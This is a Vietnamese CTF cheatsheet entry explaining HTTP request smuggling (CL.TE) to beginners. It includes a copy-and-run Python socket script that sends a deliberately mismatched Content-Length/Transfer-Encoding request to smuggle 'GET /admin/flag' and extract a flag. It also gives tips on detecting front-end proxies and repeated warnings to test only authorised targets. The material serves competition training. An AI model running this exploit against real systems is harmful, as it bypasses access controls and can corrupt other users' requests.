# HTTP Request Smuggling (giấu 1 request trong request khác)

Hầu hết web hiện đại có 2 lớp server nối tiếp: 1 proxy/WAF (lớp lọc tự động, chặn request khả nghi) hoặc CDN đứng trước, 1 server thật (backend) đứng sau. Mỗi request HTTP cần 1 cách để server biết "request này dài bao nhiêu, kết thúc ở đâu". Nếu 2 lớp server đó đọc "chỗ kết thúc" KHÁC NHAU (ví dụ 1 lớp tin vào header ghi số byte, lớp khác tin vào kiểu đọc "chia đoạn"), bạn có thể giấu 1 request thứ 2 vào bên trong request đầu — lớp đầu tưởng đã gửi xong 1 request, nhưng lớp sau lại thấy thêm 1 request nữa, request đó có thể bị ghép nhầm vào của người dùng khác gửi ngay sau bạn.

Đây là 1 kỹ thuật RỦI RO CAO khi test trên hạ tầng chung — có thể ảnh hưởng tới người chơi khác hoặc cả hệ thống. Chỉ test khi được phép rõ ràng, nên ưu tiên tự dựng/test trên service của chính đội mình trước.

Trên Burp bạn nhận ra lỗi này khi: response có header `Via`, `X-Cache`, `X-Served-By`, hoặc `Server: nginx` (tên công nghệ) khác hẳn với công nghệ app thật (ví dụ thấy cookie Laravel nhưng Server lại là nginx) — đây là dấu hiệu có 2 lớp server. Cần dùng Burp Repeater và tắt tính năng tự sửa "Content-Length" để gửi được request cố ý "méo".

## Snippet copy-là-chạy

```python
import re
import socket

host = "target"
port = 80

def solve_one(host_, port_):
    # Kỹ thuật CL.TE: lớp proxy (ngoài) đọc theo Content-Length, lớp backend (trong) đọc theo
    # Transfer-Encoding: chunked -- 2 lớp hiểu "request dài bao nhiêu" khác nhau.
    #
    # Request ẩn (smuggled) muốn nhồi vào: GET /admin/flag -- lớp proxy coi đây là 1 phần
    # BODY của request chính (vì nó đọc đủ 5 byte rồi dừng), nhưng lớp backend coi đây là
    # request MỚI (vì nó đọc tới chunk "0" rồi dừng, phần còn lại là request kế tiếp).
    smuggled = "GET /admin/flag HTTP/1.1\r\nHost: localhost\r\n\r\n"
    chunk_body = f"0\r\n\r\n{smuggled}"
    # Content-Length ở đây PHẢI cố ý ghi sai -- chỉ đủ độ dài của "0\r\n\r\n" (5 byte),
    # không phải độ dài thật của toàn bộ chunk_body. Đây chính là chỗ "lỗi cố ý" tạo bất đồng.
    cl_value = len("0\r\n\r\n")

    req = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host_}\r\n"
        f"Content-Length: {cl_value}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{chunk_body}"
    )

    try:
        sock = socket.create_connection((host_, port_), timeout=5)
        sock.sendall(req.encode())
        resp = sock.recv(8192).decode(errors="replace")
        sock.close()
    except OSError:
        return None

    m = re.search(r"FHACKER2026\{[0-9a-fA-F]{64}\}", resp)
    return m.group(0) if m else resp  # nếu chưa có flag, trả resp để tự đọc bằng mắt


if __name__ == "__main__":
    print(solve_one(host, port))
```

## Giải thích cho người mới

- Đây là bài DUY NHẤT trong bộ cheatsheet không dùng thư viện `requests` — vì `requests` tự "dọn dẹp" request cho đúng chuẩn (tự tính lại Content-Length, không cho gửi request méo), nên phải dùng `socket` (kết nối mạng thô) để tự gõ từng byte của request, giống cách bạn tự gõ tay trong Burp Repeater sau khi tắt "Update Content-Length".
- `\r\n` là ký tự xuống dòng chuẩn của HTTP (khác `\n` thường của Python) — mọi dòng header HTTP phải kết thúc bằng `\r\n`, 2 lần `\r\n\r\n` liên tiếp nghĩa là "hết phần header, bắt đầu phần body".
- `Content-Length: {cl_value}` cố ý ghi NHỎ HƠN độ dài thật của `chunk_body` — đây là "lỗi cố ý" khiến 2 lớp server đọc request khác nhau: lớp đọc theo Content-Length sẽ dừng sớm ở đúng `cl_value` byte, còn lớp đọc theo Transfer-Encoding: chunked sẽ đọc tiếp tới khi gặp đúng định dạng chunk kết thúc (`0\r\n\r\n`).
- `sock.recv(8192)` đọc tối đa 8192 byte response trả về — nếu kỹ thuật thành công, phần nội dung của request ẩn (`/admin/flag`) có thể lộ ra trong response của request KẾ TIẾP gửi trên cùng kết nối (không phải response của chính request này) — thực tế khi thi cần gửi 1 request "mồi" ngay sau để lấy phần bị lẫn ra, snippet này chỉ minh họa cấu trúc cơ bản.

## Lưu ý nhanh

- Nếu không chắc chắn có 2 lớp server, dùng kỹ thuật dò an toàn bằng đo thời gian (timing-based) trước khi gửi payload "nguy hiểm" — tool `smuggler` ở `~/hoc/CTF/Tools/web/smuggler/` tự quét hàng chục biến thể mà không ảnh hưởng ai.
- Nếu không thấy hiệu ứng, có thể app chỉ có 1 lớp server (không có proxy/CDN phía trước) — kỹ thuật này không áp dụng được.
- Nhiều backend/proxy hiện đại đã tự chặn request có cả 2 header `Content-Length` và `Transfer-Encoding` cùng lúc (đã patch) — nếu kết nối bị đóng ngay, khả năng cao là trường hợp này.
- Tuyệt đối không spam kỹ thuật này lên hạ tầng chung đang phục vụ nhiều đội — chỉ test đúng mục tiêu được phép.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
